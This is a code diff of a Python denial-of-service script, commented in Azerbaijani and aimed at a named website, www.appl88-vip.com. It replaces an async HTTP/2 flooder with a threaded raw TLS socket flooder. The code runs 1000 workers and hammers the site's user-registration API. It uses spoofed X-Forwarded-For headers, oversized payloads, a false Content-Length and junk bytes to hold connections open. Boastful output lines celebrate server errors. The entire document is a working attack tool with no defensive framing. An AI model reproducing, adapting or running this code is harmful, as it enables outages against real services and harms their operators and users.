@@ -1,63 +1,78 @@
-import asyncio
-import httpx
+import socket
+import ssl
+import threading
 import random
 import string
 import time
 
-TARGET_URL = "https://www.appl88-vip.com/"
-# Asinxron limitlər (Railway üçün ideal güc)
-WORKERS = 1000 
+# --- EXTREME TARGET ---
+TARGET_HOST = "www.appl88-vip.com"
+TARGET_PORT = 443
+# Railway Paid üçün bu rəqəmi 1000-ə qaldırırıq
+THREADS = 1000 
 
 def r_str(n):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-async def blast_worker(worker_id, client):
+def attack():
+    # SSL tənzimləmələrini serveri "təhlillə" yormaq üçün edirik
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    # Şifrələməni ən ağır səviyyəyə qoyuruq (Server CPU-su üçün mürəkkəb olsun)
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
+
     while True:
         try:
-            # Serveri yoran mürəkkəb URL parametrləri
-            url = f"{TARGET_URL}?v={time.time()}&invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(50)}"
-            
-            headers = {
-                "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15",
-                "Accept": "application/json, text/plain, */*",
-                "Content-Type": "application/json",
-                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
-                "X-Requested-With": "XMLHttpRequest",
-                "Connection": "keep-alive"
-            }
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(5)
 
-            # Serverin RAM-ını dərhal kilitləyən böyük JSON yükü
-            payload = {r_str(10): r_str(2000) for _ in range(10)}
+            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
+            conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # HTTP/2 Multiplexing - Eyni anda minlərlə yarımçıq paket
-            responses = await asyncio.gather(*[
-                client.post(url, headers=headers, json=payload, timeout=15),
-                client.get(url, headers=headers, timeout=15)
-            ], return_exceptions=True)
-            
-            # Əgər 5xx xətası gəlirse, deməli zərbə endirilir
-            for r in responses:
-                if hasattr(r, 'status_code') and r.status_code >= 500:
-                    print(f"☢️  BUM! Server Error {r.status_code}", end="\r")
+            # Bu hissə saytın qeydiyyat API-ni (register) hədəf alır
+            # Server hər sorğu üçün daxildə yeni bir prosess (fork) açmalı olur
+            for _ in range(100):
+                fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                
+                # Ağır Payload: Qeydiyyat bazasını yoran POST datası
+                payload = (
+                    f"POST /api/user/register HTTP/1.1\r\n" # Bura ən kritik nöqtədir
+                    f"Host: {TARGET_HOST}\r\n"
+                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15\r\n"
+                    f"Content-Type: application/json\r\n"
+                    f"X-Forwarded-For: {fake_ip}\r\n"
+                    f"X-Requested-With: XMLHttpRequest\r\n"
+                    f"Content-Length: 10000\r\n" # Serveri 10 KB məlumat gözləməyə məcbur edirik
+                    f"Connection: keep-alive\r\n"
+                    f"\r\n"
+                    f"{'{\"username\":\"' + r_str(20) + '\",\"password\":\"' + r_str(30) + '\",\"invite_code\":\"123456\"}'}"
+                ).encode()
 
-        except Exception:
-            await asyncio.sleep(0.01)
+                conn.sendall(payload)
+                # Serverin bağlantını bağlamaması üçün aralarda "zibil" baytlar göndər
+                conn.send(b"\x00")
+                
+            time.sleep(1)
+            conn.close()
+        except:
+            pass
 
-async def main():
-    print(f"🔥 TOTAL GIGA-BLAST INITIALIZED ON: {TARGET_URL}")
-    print("[*] Switching to Asynchronous Power - No Thread Limits.")
+def main():
+    print(f"💀 THE VOID INITIALIZED: {TARGET_HOST}")
+    print("[!] Targeting Registration API and Database Persistence...")
     
-    limits = httpx.Limits(max_connections=WORKERS, max_keepalive_connections=WORKERS)
-    
-    async with httpx.AsyncClient(
-        http2=True, 
-        verify=False, 
-        limits=limits,
-        timeout=None # Server donanda bağlantını buraxma (Slowloris)
-    ) as client:
-        
-        workers = [blast_worker(i, client) for i in range(WORKERS)]
-        await asyncio.gather(*workers)
+    for i in range(THREADS):
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
+        if i % 100 == 0:
+            print(f"[*] {i} API Flooders Deployed...")
+            time.sleep(0.5)
+
+    while True:
+        time.sleep(1)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
